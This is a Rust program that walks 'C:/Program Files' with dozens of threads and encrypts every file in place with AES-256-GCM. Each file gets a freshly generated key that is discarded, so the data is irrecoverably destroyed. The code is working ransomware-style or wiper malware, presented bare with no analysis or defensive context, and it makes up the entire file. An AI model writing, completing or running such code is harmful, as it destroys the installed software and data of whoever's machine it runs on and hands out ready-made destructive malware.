use aes_gcm::{
    aead::{AeadInPlace, KeyInit, OsRng},
    Aes256Gcm, Nonce,
};
use anyhow::{anyhow, Result};
use crossbeam::channel::{bounded, Sender};
use std::fmt::Debug;
use std::fs::OpenOptions;
use std::io::{Read, Write};
use std::os::windows::fs::MetadataExt;
use std::path::{Path, PathBuf};
use std::{fs, thread};

fn main() {
    let (send, receive) = bounded::<PathBuf>(6);

    let mut threads = vec![];

    for _ in 1..48 {
        let receive = receive.clone();
        let handle = thread::spawn(move || {
            while let Ok(file_name) = receive.recv() {
                match encrypt_file(&file_name) {
                    Ok(()) => println!("=  OK  = {}", file_name.to_string_lossy()),
                    Err(e) => println!("= FAIL = {} | {}", file_name.to_string_lossy(), e),
                }
            }
        });
        threads.push(handle);
    }

    // traverse("C:/users/v.vasiliu/code/robocopy-logs-parser", send);
    traverse("C:/Program Files", send);
    for t in threads {
        t.join();
    }
}

fn traverse<P: AsRef<Path>>(base: P, sender: Sender<PathBuf>) {
    if let Ok(dir_list) = fs::read_dir(base) {
        for e in dir_list.flatten() {
            let path = e.path();
            if let Ok(metadata) = e.metadata() {
                match metadata.is_dir() {
                    true => traverse(path, sender.clone()),
                    false => {
                        sender.send(path);
                        // println!("{}", path.to_string_lossy())
                    }
                }
            }
        }
    }
}

fn encrypt_file<P: Debug + AsRef<Path>>(path: P) -> Result<()> {
    let key = Aes256Gcm::generate_key(&mut OsRng);
    let cipher = Aes256Gcm::new(&key);
    let nonce = Nonce::from_slice(b"unique nonce");

    let mut src_file = OpenOptions::new().read(true).open(&path)?;
    let mut buf = Vec::with_capacity(src_file.metadata()?.file_size() as usize);
    src_file.read_to_end(&mut buf)?;
    cipher
        .encrypt_in_place(nonce, b"", &mut buf)
        .map_err(|e| anyhow!("Failed to encrypt: {}", e))?;
    let mut dst_file = OpenOptions::new().write(true).open(&path)?;
    dst_file.write_all(&*buf)?;
    Ok(())
}
